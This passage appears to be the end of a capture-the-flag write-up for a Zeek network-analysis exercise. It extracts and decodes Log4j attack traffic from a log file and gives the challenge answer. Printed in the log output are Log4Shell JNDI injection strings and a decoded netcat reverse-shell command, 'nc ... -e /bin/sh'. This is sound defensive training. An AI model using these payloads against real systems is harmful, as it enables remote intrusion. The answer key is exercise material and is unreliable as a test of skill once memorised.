1640025554.661073  CDCepI1u0HYtKrT4f6  /  192.168.56.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==  192.168.56.102:389  192.168.56.102  389  GET  T  X-API-VERSION  ${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==}  F  T
```

Interesting fields ought to be:

- uri
- value

We are probably only interested in Base64-endcoded data, as in the output above.

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ cat log4j.log | zeek-cut uri value | grep Base64
192.168.56.102:389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=  ${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}
192.168.56.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==  ${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==}
192.168.56.102:389/Basic/Command/Base64/bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==  ${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==}
```

Base64-decoding is easily done with `base64 -d`

```bash
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ echo 'dG91Y2ggL3RtcC9wd25lZAo=' | base64 -d
touch /tmp/pwned
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ echo 'd2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==' | base64 -d
which nc > /tmp/pwned
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ echo 'bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==' | base64 -d
nc 192.168.56.102 80 -e /bin/sh -vvv
ubuntu@ip-10-66-141-187:~/Desktop/Exercise-Files/log4j$ 
```

Answer: `pwned`

### Task 5: Conclusion

**Congratulations**! You just finished the Zeek exercises.

If you like this content, make sure you visit the following rooms later on THM;

- [Snort](https://tryhackme.com/room/snort)
- [Snort Challenges 1](https://tryhackme.com/room/snortchallenges1)
- [Snort Challenges 2](https://tryhackme.com/room/snortchallenges2)
- [Wireshark](https://tryhackme.com/room/wireshark)
- [NetworkMiner](https://tryhackme.com/room/networkminer)

Note that there are challenge rooms available for the discussed content. Use the search option to find them! Happy hacking!

For additional information, please see the references below.

## References

- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [cut - Linux manual page](https://man7.org/linux/man-pages/man1/cut.1.html)
- [Domain Name System - Wikipedia](https://en.wikipedia.org/wiki/Domain_Name_System)
- [head - Linux manual page](https://man7.org/linux/man-pages/man1/head.1.html)
- [HTTP - Wikipedia](https://en.wikipedia.org/wiki/HTTP)
- [Log4j - Wikipedia](https://en.wikipedia.org/wiki/Log4j)
- [pcap - Wikipedia](https://en.wikipedia.org/wiki/Pcap)
- [rev - Linux manual page](https://man7.org/linux/man-pages/man1/rev.1.html)
- [SHA-1 - Wikipedia](https://en.wikipedia.org/wiki/SHA-1)
- [sort - Linux manual page](https://man7.org/linux/man-pages/man1/sort.1.html)
- [uniq - Linux manual page](https://man7.org/linux/man-pages/man1/uniq.1.html)
- [VirusTotal - Homepage](https://www.virustotal.com/gui/home/upload)
- [wc - Linux manual page](https://man7.org/linux/man-pages/man1/wc.1.html)
- [Zeek - Documentation](https://docs.zeek.org/en/master/index.html)
- [Zeek - GitHub](https://github.com/zeek/zeek)
- [Zeek - Homepage](https://zeek.org/)
